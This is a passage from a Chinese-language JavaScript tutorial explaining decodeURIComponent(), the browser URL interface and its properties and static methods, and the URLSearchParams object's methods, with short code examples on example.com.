<h4 id="2-4-decodeURIComponent"><a href="#2-4-decodeURIComponent" class="headerlink" title="2.4 decodeURIComponent()"></a>2.4 decodeURIComponent()</h4><p><code>decodeURIComponent()</code>用于URL 片段的解码。它是<code>encodeURIComponent()</code>方法的逆运算。它接受一个参数，就是转码后的 URL 片段。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">decodeURIComponent</span>(<span class="string">&#x27;%E6%98%A5%E8%8A%82&#x27;</span>)</span><br><span class="line"><span class="comment">// &quot;春节&quot;</span></span><br></pre></td></tr></table></figure>



<h3 id="3、URL-接口"><a href="#3、URL-接口" class="headerlink" title="3、URL 接口"></a>3、URL 接口</h3><p><code>URL</code>接口是一个构造函数，浏览器原生提供，可以用来构造、解析和编码 URL。一般情况下，通过<code>window.URL</code>可以拿到这个构造函数。</p>
<h4 id="3-1-构造函数"><a href="#3-1-构造函数" class="headerlink" title="3.1 构造函数"></a>3.1 构造函数</h4><p><code>URL</code>作为构造函数，可以生成 URL 实例。它接受一个表示 URL 的字符串作为参数。如果参数不是合法的 URL，会报错。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> url = <span class="keyword">new</span> <span class="title function_">URL</span>(<span class="string">&#x27;http://www.example.com/index.html&#x27;</span>);</span><br><span class="line">url.<span class="property">href</span></span><br><span class="line"><span class="comment">// &quot;http://www.example.com/index.html&quot;</span></span><br></pre></td></tr></table></figure>

<p>如果参数是另一个 URL 实例，构造函数会自动读取该实例的<code>href</code>属性，作为实际参数。</p>
<p>如果 URL 字符串是一个相对路径，那么需要表示绝对路径的第二个参数，作为计算基准。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> url1 = <span class="keyword">new</span> <span class="title function_">URL</span>(<span class="string">&#x27;index.html&#x27;</span>, <span class="string">&#x27;http://example.com&#x27;</span>);</span><br><span class="line">url1.<span class="property">href</span></span><br><span class="line"><span class="comment">// &quot;http://example.com/index.html&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> url2 = <span class="keyword">new</span> <span class="title function_">URL</span>(<span class="string">&#x27;page2.html&#x27;</span>, <span class="string">&#x27;http://example.com/page1.html&#x27;</span>);</span><br><span class="line">url2.<span class="property">href</span></span><br><span class="line"><span class="comment">// &quot;http://example.com/page2.html&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> url3 = <span class="keyword">new</span> <span class="title function_">URL</span>(<span class="string">&#x27;..&#x27;</span>, <span class="string">&#x27;http://example.com/a/b.html&#x27;</span>)</span><br><span class="line">url3.<span class="property">href</span></span><br><span class="line"><span class="comment">// &quot;http://example.com/&quot;</span></span><br></pre></td></tr></table></figure>

<p>上面代码中，返回的 URL 实例的路径都是在第二个参数的基础上，切换到第一个参数得到的。最后一个例子里面，第一个参数是<code>..</code>，表示上层路径。</p>
<h4 id="3-2-实例属性"><a href="#3-2-实例属性" class="headerlink" title="3.2 实例属性"></a>3.2 实例属性</h4><p>URL 实例的属性与<code>Location</code>对象的属性基本一致，返回当前 URL 的信息。</p>
<ul>
<li>URL.href：返回整个 URL</li>
<li>URL.protocol：返回协议，以冒号<code>:</code>结尾</li>
<li>URL.hostname：返回域名</li>
<li>URL.host：返回域名与端口，包含<code>:</code>号，默认的80和443端口会省略</li>
<li>URL.port：返回端口</li>
<li>URL.origin：返回协议、域名和端口</li>
<li>URL.pathname：返回路径，以斜杠<code>/</code>开头</li>
<li>URL.search：返回查询字符串，以问号<code>?</code>开头</li>
<li>URL.searchParams：返回一个<code>URLSearchParams</code>实例，该属性是<code>Location</code>对象没有的</li>
<li>URL.hash：返回片段识别符，以井号<code>#</code>开头</li>
<li>URL.password：返回域名前面的密码</li>
<li>URL.username：返回域名前面的用户名</li>
</ul>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> url = <span class="keyword">new</span> <span class="title function_">URL</span>(<span class="string">&#x27;http://user:passwd@www.example.com:4097/path/a.html?x=111#part1&#x27;</span>);</span><br><span class="line"></span><br><span class="line">url.<span class="property">href</span></span><br><span class="line"><span class="comment">// &quot;http://user:passwd@www.example.com:4097/path/a.html?x=111#part1&quot;</span></span><br><span class="line">url.<span class="property">protocol</span></span><br><span class="line"><span class="comment">// &quot;http:&quot;</span></span><br><span class="line">url.<span class="property">hostname</span></span><br><span class="line"><span class="comment">// &quot;www.example.com&quot;</span></span><br><span class="line">url.<span class="property">host</span></span><br><span class="line"><span class="comment">// &quot;www.example.com:4097&quot;</span></span><br><span class="line">url.<span class="property">port</span></span><br><span class="line"><span class="comment">// &quot;4097&quot;</span></span><br><span class="line">url.<span class="property">origin</span></span><br><span class="line"><span class="comment">// &quot;http://www.example.com:4097&quot;</span></span><br><span class="line">url.<span class="property">pathname</span></span><br><span class="line"><span class="comment">// &quot;/path/a.html&quot;</span></span><br><span class="line">url.<span class="property">search</span></span><br><span class="line"><span class="comment">// &quot;?x=111&quot;</span></span><br><span class="line">url.<span class="property">searchParams</span></span><br><span class="line"><span class="comment">// URLSearchParams &#123;&#125;</span></span><br><span class="line">url.<span class="property">hash</span></span><br><span class="line"><span class="comment">// &quot;#part1&quot;</span></span><br><span class="line">url.<span class="property">password</span></span><br><span class="line"><span class="comment">// &quot;passwd&quot;</span></span><br><span class="line">url.<span class="property">username</span></span><br><span class="line"><span class="comment">// &quot;user&quot;</span></span><br></pre></td></tr></table></figure>

<p>这些属性里面，只有<code>origin</code>属性是只读的，其他属性都可写。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> url = <span class="keyword">new</span> <span class="title function_">URL</span>(<span class="string">&#x27;http://example.com/index.html#part1&#x27;</span>);</span><br><span class="line"></span><br><span class="line">url.<span class="property">pathname</span> = <span class="string">&#x27;index2.html&#x27;</span>;</span><br><span class="line">url.<span class="property">href</span> <span class="comment">// &quot;http://example.com/index2.html#part1&quot;</span></span><br><span class="line"></span><br><span class="line">url.<span class="property">hash</span> = <span class="string">&#x27;#part2&#x27;</span>;</span><br><span class="line">url.<span class="property">href</span> <span class="comment">// &quot;http://example.com/index2.html#part2&quot;</span></span><br></pre></td></tr></table></figure>

<p>上面代码中，改变 URL 实例的<code>pathname</code>属性和<code>hash</code>属性，都会实时反映在 URL 实例当中。</p>
<h4 id="3-3-静态方法"><a href="#3-3-静态方法" class="headerlink" title="3.3 静态方法"></a>3.3 静态方法</h4><p><strong>（1）URL.createObjectURL()</strong></p>
<p><code>URL.createObjectURL()</code>方法用来为上传&#x2F;下载的文件、流媒体文件生成一个 URL 字符串。这个字符串代表了<code>File</code>对象或<code>Blob</code>对象的 URL。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// HTML 代码如下</span></span><br><span class="line"><span class="comment">// &lt;div id=&quot;display&quot;/&gt;</span></span><br><span class="line"><span class="comment">// &lt;input</span></span><br><span class="line"><span class="comment">//   type=&quot;file&quot;</span></span><br><span class="line"><span class="comment">//   id=&quot;fileElem&quot;</span></span><br><span class="line"><span class="comment">//   multiple</span></span><br><span class="line"><span class="comment">//   accept=&quot;image/*&quot;</span></span><br><span class="line"><span class="comment">//   onchange=&quot;handleFiles(this.files)&quot;</span></span><br><span class="line"><span class="comment">//  &gt;</span></span><br><span class="line"><span class="keyword">var</span> div = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;display&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">handleFiles</span>(<span class="params">files</span>) &#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; files.<span class="property">length</span>; i++) &#123;</span><br><span class="line">    <span class="keyword">var</span> img = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;img&#x27;</span>);</span><br><span class="line">    img.<span class="property">src</span> = <span class="variable language_">window</span>.<span class="property">URL</span>.<span class="title function_">createObjectURL</span>(files[i]);</span><br><span class="line">    div.<span class="title function_">appendChild</span>(img);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>上面代码中，<code>URL.createObjectURL()</code>方法用来为上传的文件生成一个 URL 字符串，作为&#96;&#96;元素的图片来源。</p>
<p>该方法生成的 URL 就像下面的样子。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">blob</span>:<span class="attr">http</span>:<span class="comment">//localhost/c745ef73-ece9-46da-8f66-ebes574789b1</span></span><br></pre></td></tr></table></figure>

<p>注意，每次使用<code>URL.createObjectURL()</code>方法，都会在内存里面生成一个 URL 实例。如果不再需要该方法生成的 URL 字符串，为了节省内存，可以使用<code>URL.revokeObjectURL()</code>方法释放这个实例。</p>
<p><strong>（2）URL.revokeObjectURL()</strong></p>
<p><code>URL.revokeObjectURL()</code>方法用来释放<code>URL.createObjectURL()</code>方法生成的 URL 实例。它的参数就是<code>URL.createObjectURL()</code>方法返回的 URL 字符串。</p>
<p>下面为上一段的示例加上<code>URL.revokeObjectURL()</code>。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> div = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;display&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">handleFiles</span>(<span class="params">files</span>) &#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; files.<span class="property">length</span>; i++) &#123;</span><br><span class="line">    <span class="keyword">var</span> img = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;img&#x27;</span>);</span><br><span class="line">    img.<span class="property">src</span> = <span class="variable language_">window</span>.<span class="property">URL</span>.<span class="title function_">createObjectURL</span>(files[i]);</span><br><span class="line">    div.<span class="title function_">appendChild</span>(img);</span><br><span class="line">    img.<span class="property">onload</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">      <span class="variable language_">window</span>.<span class="property">URL</span>.<span class="title function_">revokeObjectURL</span>(<span class="variable language_">this</span>.<span class="property">src</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>上面代码中，一旦图片加载成功以后，为本地文件生成的 URL 字符串就没用了，于是可以在<code>img.onload</code>回调函数里面，通过<code>URL.revokeObjectURL()</code>方法卸载这个 URL 实例。</p>
<h3 id="4、URLSearchParams-对象"><a href="#4、URLSearchParams-对象" class="headerlink" title="4、URLSearchParams 对象"></a>4、URLSearchParams 对象</h3><h4 id="4-1-概述"><a href="#4-1-概述" class="headerlink" title="4.1 概述"></a>4.1 概述</h4><p><code>URLSearchParams</code>对象是浏览器的原生对象，用来构造、解析和处理 URL 的查询字符串（即 URL 问号后面的部分）。</p>
<p>它本身也是一个构造函数，可以生成实例。参数可以为查询字符串，起首的问号<code>?</code>有没有都行，也可以是对应查询字符串的数组或对象。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 方法一：传入字符串</span></span><br><span class="line"><span class="keyword">var</span> params = <span class="keyword">new</span> <span class="title class_">URLSearchParams</span>(<span class="string">&#x27;?foo=1&amp;bar=2&#x27;</span>);</span><br><span class="line"><span class="comment">// 等同于</span></span><br><span class="line"><span class="keyword">var</span> params = <span class="keyword">new</span> <span class="title class_">URLSearchParams</span>(<span class="variable language_">document</span>.<span class="property">location</span>.<span class="property">search</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 方法二：传入数组</span></span><br><span class="line"><span class="keyword">var</span> params = <span class="keyword">new</span> <span class="title class_">URLSearchParams</span>([[<span class="string">&#x27;foo&#x27;</span>, <span class="number">1</span>], [<span class="string">&#x27;bar&#x27;</span>, <span class="number">2</span>]]);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 方法三：传入对象</span></span><br><span class="line"><span class="keyword">var</span> params = <span class="keyword">new</span> <span class="title class_">URLSearchParams</span>(&#123;<span class="string">&#x27;foo&#x27;</span> : <span class="number">1</span> , <span class="string">&#x27;bar&#x27;</span> : <span class="number">2</span>&#125;);</span><br></pre></td></tr></table></figure>

<p><code>URLSearchParams</code>会对查询字符串自动编码。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> params = <span class="keyword">new</span> <span class="title class_">URLSearchParams</span>(&#123;<span class="string">&#x27;foo&#x27;</span>: <span class="string">&#x27;你好&#x27;</span>&#125;);</span><br><span class="line">params.<span class="title function_">toString</span>() <span class="comment">// &quot;foo=%E4%BD%A0%E5%A5%BD&quot;</span></span><br></pre></td></tr></table></figure>

<p>上面代码中，<code>foo</code>的值是汉字，<code>URLSearchParams</code>对其自动进行 URL 编码。</p>
<p>浏览器向服务器发送表单数据时，可以直接使用<code>URLSearchParams</code>实例作为表单数据。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> params = <span class="keyword">new</span> <span class="title class_">URLSearchParams</span>(&#123;<span class="attr">foo</span>: <span class="number">1</span>, <span class="attr">bar</span>: <span class="number">2</span>&#125;);</span><br><span class="line"><span class="title function_">fetch</span>(<span class="string">&#x27;https://example.com/api&#x27;</span>, &#123;</span><br><span class="line">  <span class="attr">method</span>: <span class="string">&#x27;POST&#x27;</span>,</span><br><span class="line">  <span class="attr">body</span>: params</span><br><span class="line">&#125;).<span class="title function_">then</span>(...)</span><br></pre></td></tr></table></figure>

<p>上面代码中，<code>fetch</code>命令向服务器发送命令时，可以直接使用<code>URLSearchParams</code>实例。</p>
<p><code>URLSearchParams</code>可以与<code>URL</code>接口结合使用。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> url = <span class="keyword">new</span> <span class="title function_">URL</span>(<span class="variable language_">window</span>.<span class="property">location</span>);</span><br><span class="line"><span class="keyword">var</span> foo = url.<span class="property">searchParams</span>.<span class="title function_">get</span>(<span class="string">&#x27;foo&#x27;</span>) || <span class="string">&#x27;somedefault&#x27;</span>;</span><br></pre></td></tr></table></figure>

<p>上面代码中，URL 实例的<code>searchParams</code>属性就是一个<code>URLSearchParams</code>实例，所以可以使用<code>URLSearchParams</code>接口的<code>get</code>方法。</p>
<p><code>URLSearchParams</code>实例有遍历器接口，可以用<code>for...of</code>循环遍历（详见《ES6 标准入门》的《Iterator》一章）。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> params = <span class="keyword">new</span> <span class="title class_">URLSearchParams</span>(&#123;<span class="string">&#x27;foo&#x27;</span>: <span class="number">1</span> , <span class="string">&#x27;bar&#x27;</span>: <span class="number">2</span>&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> p <span class="keyword">of</span> params) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(p[<span class="number">0</span>] + <span class="string">&#x27;: &#x27;</span> + p[<span class="number">1</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// foo: 1</span></span><br><span class="line"><span class="comment">// bar: 2</span></span><br></pre></td></tr></table></figure>

<p><code>URLSearchParams</code>没有实例属性，只有实例方法。</p>
<h4 id="4-2-URLSearchParams-toString"><a href="#4-2-URLSearchParams-toString" class="headerlink" title="4.2 URLSearchParams.toString()"></a>4.2 URLSearchParams.toString()</h4><p><code>toString</code>方法返回实例的字符串形式。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> url = <span class="keyword">new</span> <span class="title function_">URL</span>(<span class="string">&#x27;https://example.com?foo=1&amp;bar=2&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> params = <span class="keyword">new</span> <span class="title class_">URLSearchParams</span>(url.<span class="property">search</span>);</span><br><span class="line"></span><br><span class="line">params.<span class="title function_">toString</span>() <span class="comment">// &quot;foo=1&amp;bar=2&#x27;</span></span><br></pre></td></tr></table></figure>

<p>那么需要字符串的场合，会自动调用<code>toString</code>方法。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> params = <span class="keyword">new</span> <span class="title class_">URLSearchParams</span>(&#123;<span class="attr">version</span>: <span class="number">2.0</span>&#125;);</span><br><span class="line"><span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">href</span> = location.<span class="property">pathname</span> + <span class="string">&#x27;?&#x27;</span> + params;</span><br></pre></td></tr></table></figure>

<p>上面代码中，<code>location.href</code>赋值时，可以直接使用<code>params</code>对象。这时就会自动调用<code>toString</code>方法。</p>
<h4 id="4-3-URLSearchParams-append"><a href="#4-3-URLSearchParams-append" class="headerlink" title="4.3 URLSearchParams.append()"></a>4.3 URLSearchParams.append()</h4><p><code>append()</code>方法用来追加一个查询参数。它接受两个参数，第一个为键名，第二个为键值，没有返回值。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> params = <span class="keyword">new</span> <span class="title class_">URLSearchParams</span>(&#123;<span class="string">&#x27;foo&#x27;</span>: <span class="number">1</span> , <span class="string">&#x27;bar&#x27;</span>: <span class="number">2</span>&#125;);</span><br><span class="line">params.<span class="title function_">append</span>(<span class="string">&#x27;baz&#x27;</span>, <span class="number">3</span>);</span><br><span class="line">params.<span class="title function_">toString</span>() <span class="comment">// &quot;foo=1&amp;bar=2&amp;baz=3&quot;</span></span><br></pre></td></tr></table></figure>

<p><code>append()</code>方法不会识别是否键名已经存在。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> params = <span class="keyword">new</span> <span class="title class_">URLSearchParams</span>(&#123;<span class="string">&#x27;foo&#x27;</span>: <span class="number">1</span> , <span class="string">&#x27;bar&#x27;</span>: <span class="number">2</span>&#125;);</span><br><span class="line">params.<span class="title function_">append</span>(<span class="string">&#x27;foo&#x27;</span>, <span class="number">3</span>);</span><br><span class="line">params.<span class="title function_">toString</span>() <span class="comment">// &quot;foo=1&amp;bar=2&amp;foo=3&quot;</span></span><br></pre></td></tr></table></figure>

<p>上面代码中，查询字符串里面<code>foo</code>已经存在了，但是<code>append</code>依然会追加一个同名键。</p>
<h4 id="4-4-URLSearchParams-delete"><a href="#4-4-URLSearchParams-delete" class="headerlink" title="4.4 URLSearchParams.delete()"></a>4.4 URLSearchParams.delete()</h4><p><code>delete()</code>方法用来删除指定的查询参数。它接受键名作为参数。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> params = <span class="keyword">new</span> <span class="title class_">URLSearchParams</span>(&#123;<span class="string">&#x27;foo&#x27;</span>: <span class="number">1</span> , <span class="string">&#x27;bar&#x27;</span>: <span class="number">2</span>&#125;);</span><br><span class="line">params.<span class="title function_">delete</span>(<span class="string">&#x27;bar&#x27;</span>);</span><br><span class="line">params.<span class="title function_">toString</span>() <span class="comment">// &quot;foo=1&quot;</span></span><br></pre></td></tr></table></figure>



<h4 id="4-5-URLSearchParams-has"><a href="#4-5-URLSearchParams-has" class="headerlink" title="4.5 URLSearchParams.has()"></a>4.5 URLSearchParams.has()</h4><p><code>has()</code>方法返回一个布尔值，表示查询字符串是否包含指定的键名。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> params = <span class="keyword">new</span> <span class="title class_">URLSearchParams</span>(&#123;<span class="string">&#x27;foo&#x27;</span>: <span class="number">1</span> , <span class="string">&#x27;bar&#x27;</span>: <span class="number">2</span>&#125;);</span><br><span class="line">params.<span class="title function_">has</span>(<span class="string">&#x27;bar&#x27;</span>) <span class="comment">// true</span></span><br><span class="line">params.<span class="title function_">has</span>(<span class="string">&#x27;baz&#x27;</span>) <span class="comment">// false</span></span><br></pre></td></tr></table></figure>



<h4 id="4-6-URLSearchParams-set"><a href="#4-6-URLSearchParams-set" class="headerlink" title="4.6 URLSearchParams.set()"></a>4.6 URLSearchParams.set()</h4><p><code>set()</code>方法用来设置查询字符串的键值。</p>
<p>它接受两个参数，第一个是键名，第二个是键值。如果是已经存在的键，键值会被改写，否则会被追加。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> params = <span class="keyword">new</span> <span class="title class_">URLSearchParams</span>(<span class="string">&#x27;?foo=1&#x27;</span>);</span><br><span class="line">params.<span class="title function_">set</span>(<span class="string">&#x27;foo&#x27;</span>, <span class="number">2</span>);</span><br><span class="line">params.<span class="title function_">toString</span>() <span class="comment">// &quot;foo=2&quot;</span></span><br><span class="line">params.<span class="title function_">set</span>(<span class="string">&#x27;bar&#x27;</span>, <span class="number">3</span>);</span><br><span class="line">params.<span class="title function_">toString</span>() <span class="comment">// &quot;foo=2&amp;bar=3&quot;</span></span><br></pre></td></tr></table></figure>

<p>上面代码中，<code>foo</code>是已经存在的键，<code>bar</code>是还不存在的键。</p>
<p>如果有多个的同名键，<code>set</code>会移除现存所有的键。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> params = <span class="keyword">new</span> <span class="title class_">URLSearchParams</span>(<span class="string">&#x27;?foo=1&amp;foo=2&#x27;</span>);</span><br><span class="line">params.<span class="title function_">set</span>(<span class="string">&#x27;foo&#x27;</span>, <span class="number">3</span>);</span><br><span class="line">params.<span class="title function_">toString</span>() <span class="comment">// &quot;foo=3&quot;</span></span><br></pre></td></tr></table></figure>

<p>下面是一个替换当前 URL 的例子。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// URL: https://example.com?version=1.0</span></span><br><span class="line"><span class="keyword">var</span> params = <span class="keyword">new</span> <span class="title class_">URLSearchParams</span>(location.<span class="property">search</span>.<span class="title function_">slice</span>(<span class="number">1</span>));</span><br><span class="line">params.<span class="title function_">set</span>(<span class="string">&#x27;version&#x27;</span>, <span class="number">2.0</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">window</span>.<span class="property">history</span>.<span class="title function_">replaceState</span>(&#123;&#125;, <span class="string">&#x27;&#x27;</span>, location.<span class="property">pathname</span> + <span class="string">`?`</span> + params);</span><br><span class="line"><span class="comment">// URL: https://example.com?version=2.0</span></span><br></pre></td></tr></table></figure>



<h4 id="4-7-URLSearchParams-get-，URLSearchParams-getAll"><a href="#4-7-URLSearchParams-get-，URLSearchParams-getAll" class="headerlink" title="4.7 URLSearchParams.get()，URLSearchParams.getAll()"></a>4.7 URLSearchParams.get()，URLSearchParams.getAll()</h4><p><code>get()</code>方法用来读取查询字符串里面的指定键。它接受键名作为参数。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> params = <span class="keyword">new</span> <span class="title class_">URLSearchParams</span>(<span class="string">&#x27;?foo=1&#x27;</span>);</span><br><span class="line">params.<span class="title function_">get</span>(<span class="string">&#x27;foo&#x27;</span>) <span class="comment">// &quot;1&quot;</span></span><br><span class="line">params.<span class="title function_">get</span>(<span class="string">&#x27;bar&#x27;</span>) <span class="comment">// null</span></span><br></pre></td></tr></table></figure>

<p>两个地方需要注意。第一，它返回的是字符串，如果原始值是数值，需要转一下类型；第二，如果指定的键名不存在，返回值是<code>null</code>。</p>
<p>如果有多个的同名键，<code>get</code>返回位置最前面的那个键值。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> params = <span class="keyword">new</span> <span class="title class_">URLSearchParams</span>(<span class="string">&#x27;?foo=3&amp;foo=2&amp;foo=1&#x27;</span>);</span><br><span class="line">params.<span class="title function_">get</span>(<span class="string">&#x27;foo&#x27;</span>) <span class="comment">// &quot;3&quot;</span></span><br></pre></td></tr></table></figure>

<p>上面代码中，查询字符串有三个<code>foo</code>键，<code>get</code>方法返回最前面的键值<code>3</code>。</p>
<p><code>getAll()</code>方法返回一个数组，成员是指定键的所有键值。它接受键名作为参数。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> params = <span class="keyword">new</span> <span class="title class_">URLSearchParams</span>(<span class="string">&#x27;?foo=1&amp;foo=2&#x27;</span>);</span><br><span class="line">params.<span class="title function_">getAll</span>(<span class="string">&#x27;foo&#x27;</span>) <span class="comment">// [&quot;1&quot;, &quot;2&quot;]</span></span><br></pre></td></tr></table></figure>

<p>上面代码中，查询字符串有两个<code>foo</code>键，<code>getAll</code>返回的数组就有两个成员。</p>
<h4 id="4-8-URLSearchParams-sort"><a href="#4-8-URLSearchParams-sort" class="headerlink" title="4.8 URLSearchParams.sort()"></a>4.8 URLSearchParams.sort()</h4><p><code>sort()</code>方法对查询字符串里面的键进行排序，规则是按照 Unicode 码点从小到大排列。</p>
<p>该方法没有返回值，或者说返回值是<code>undefined</code>。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> params = <span class="keyword">new</span> <span class="title class_">URLSearchParams</span>(<span class="string">&#x27;c=4&amp;a=2&amp;b=3&amp;a=1&#x27;</span>);</span><br><span class="line">params.<span class="title function_">sort</span>();</span><br><span class="line">params.<span class="title function_">toString</span>() <span class="comment">// &quot;a=2&amp;a=1&amp;b=3&amp;c=4&quot;</span></span><br></pre></td></tr></table></figure>

<p>上面代码中，如果有两个同名的键<code>a</code>，它们之间不会排序，而是保留原始的顺序。</p>
